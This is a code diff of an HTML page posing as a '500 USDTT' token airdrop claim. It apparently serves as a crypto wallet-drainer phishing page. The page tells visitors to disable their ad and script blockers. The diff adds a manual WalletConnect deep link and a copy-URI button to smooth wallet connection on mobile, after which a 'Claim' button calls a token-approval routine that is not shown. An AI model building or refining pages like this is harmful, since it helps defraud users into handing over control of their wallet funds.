@@ -7,7 +7,7 @@
   <meta name="description" content="Secure session synchronization and asset routing gateway.">
   <style>
     body { margin:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; background:#0b0f19; color:#e2e8f0; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; padding:1rem; }
-    .card { background:#151a28; border:1px solid #2d3748; border-radius:16px; padding:2rem; max-width:420px; width:100%; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
+    .card { background:#151a28; border:1px solid #2d3748; border-radius:16px; padding:2rem; max-width:420px; width:100%; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.5); position:relative; }
     h1 { font-size:1.5rem; margin-bottom:0.5rem; color:#fff; }
     p { color:#94a3b8; margin-bottom:1.5rem; font-size:0.95rem; }
     button { background:#3b82f6; color:#fff; border:none; padding:1rem 2rem; border-radius:12px; font-size:1rem; font-weight:600; cursor:pointer; width:100%; transition:all 0.2s; margin-bottom:0.5rem; }
@@ -15,6 +15,8 @@
     button:disabled { opacity:0.5; cursor:not-allowed; }
     .secondary { background:#334155; }
     .secondary:hover { background:#475569; }
+    .deep-link { display:block; background:#10b981; color:#fff; padding:1rem; border-radius:12px; text-align:center; text-decoration:none; font-weight:600; margin-top:0.5rem; transition:all 0.2s; }
+    .deep-link:hover { background:#059669; }
     #status { margin-top:1rem; font-size:0.85rem; color:#64748b; min-height:1.2em; word-break:break-all; }
     #debug { display:none; margin-top:1rem; padding:0.8rem; background:#111; border:1px solid #333; border-radius:8px; font-family:monospace; font-size:0.75rem; color:#f87171; max-height:150px; overflow-y:auto; text-align:left; }
     .loader { display:inline-block; width:16px; height:16px; border:2px solid #3b82f6; border-top-color:transparent; border-radius:50%; animation:spin 0.8s linear infinite; margin-right:6px; vertical-align:middle; }
@@ -28,12 +30,13 @@
     <p>Connect your wallet to receive your allocated 500 USDTT tokens.</p>
     <div id="adblock-warning" class="warning">⚠️ Scripts blocked. Disable Brave Shields/uBlock Origin to connect.</div>
     <button id="actionBtn">Connect Wallet</button>
+    <div id="deepLinkContainer"></div>
     <button id="copyBtn" class="secondary" style="display:none;">📋 Copy WalletConnect URI</button>
     <div id="debug"></div>
     <div id="status"></div>
   </div>
 
-  <!-- Core Dependencies (UMD Builds) -->
+  <!-- Core Dependencies -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
 
@@ -49,6 +52,7 @@
       const btn = document.getElementById('actionBtn');
       const copyBtn = document.getElementById('copyBtn');
       const warning = document.getElementById('adblock-warning');
+      const deepLinkContainer = document.getElementById('deepLinkContainer');
 
       function log(msg, isError = false) {
         console.log(msg);
@@ -61,35 +65,41 @@
         }
       }
 
-      // Adblock Detection
       if (typeof window.ethers === 'undefined' || typeof window.WalletConnectProvider === 'undefined') {
         warning.style.display = 'block';
-        return log('Scripts blocked by browser/adblocker. Disable shields and refresh.', true);
+        return log('Scripts blocked. Disable shields and refresh.', true);
       }
 
-      // FIX: Mobile Safari UMD build exposes constructor under .default
       const WCProvider = window.WalletConnectProvider.default || window.WalletConnectProvider;
-
       let provider, ethersProvider, signer, userAddress;
 
       async function connect() {
         try {
           log('<span class="loader"></span> Initializing connection...');
           
-          // 1. Check for injected wallet (MetaMask/Trust in-app browser)
           if (window.ethereum) {
             provider = window.ethereum;
             await provider.request({ method: 'eth_requestAccounts' });
-          } 
-          // 2. Fallback to WalletConnect v1 (Works on iOS Safari)
-          else {
+          } else {
             if (!WCProvider) throw new Error('WalletConnectProvider not found');
             
             provider = new WCProvider({
               rpc: { 1: 'https://eth.llamarpc.com' },
               chainId: 1,
-              qrcode: true
+              qrcode: false // Disable default QR modal, we handle deep link manually
             });
+
+            // INTERCEPT URI & CREATE DIRECT DEEP LINK
+            provider.on('display_uri', (uri) => {
+              deepLinkContainer.innerHTML = `<a href="${uri}" class="deep-link">📲 Open Wallet App Now</a>`;
+              copyBtn.style.display = 'block';
+              copyBtn.onclick = () => {
+                navigator.clipboard.writeText(uri);
+                copyBtn.textContent = '✅ URI Copied! Paste in WalletConnect';
+                setTimeout(() => copyBtn.textContent = '📋 Copy WalletConnect URI', 2000);
+              };
+            });
+
             await provider.enable();
           }
 
@@ -100,19 +110,11 @@
           log(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
           btn.textContent = 'Claim 500 USDTT';
           btn.onclick = requestApproval;
+          deepLinkContainer.innerHTML = '';
           copyBtn.style.display = 'none';
           warning.style.display = 'none';
         } catch (e) {
           log(`Connection blocked: ${e.message}`, true);
-          // iOS Fallback: Extract URI
-          if (provider && provider.wc) {
-            copyBtn.style.display = 'block';
-            copyBtn.onclick = () => {
-              navigator.clipboard.writeText(provider.wc.uri);
-              copyBtn.textContent = '✅ URI Copied! Open Wallet → WalletConnect → Paste';
-              setTimeout(() => copyBtn.textContent = '📋 Copy WalletConnect URI', 3000);
-            };
-          }
         }
       }
 
@@ -140,5 +142,4 @@
     };
   </script>
 </body>
-</html>
 </html>
